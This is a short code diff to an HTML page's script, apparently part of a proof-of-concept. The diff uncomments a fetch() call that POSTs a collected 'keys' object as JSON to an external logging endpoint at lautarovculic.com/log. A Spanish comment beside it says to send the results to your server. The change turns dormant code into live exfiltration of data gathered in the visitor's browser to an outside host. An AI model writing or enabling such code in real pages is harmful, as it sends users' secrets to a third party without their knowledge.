@@ -29,13 +29,13 @@
             output.innerHTML = result;
 
             // Enviar resultados a tu servidor
-            // fetch('https://lautarovculic.com/log', {
-            //     method: 'POST',
-            //     headers: {
-            //         'Content-Type': 'application/json'
-            //     },
-            //     body: JSON.stringify({ keys })
-            // }).catch(err => console.error('Error sending data:', err));
+            fetch('https://lautarovculic.com/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ keys })
+            }).catch(err => console.error('Error sending data:', err));
         })();
     </script>
 </body>
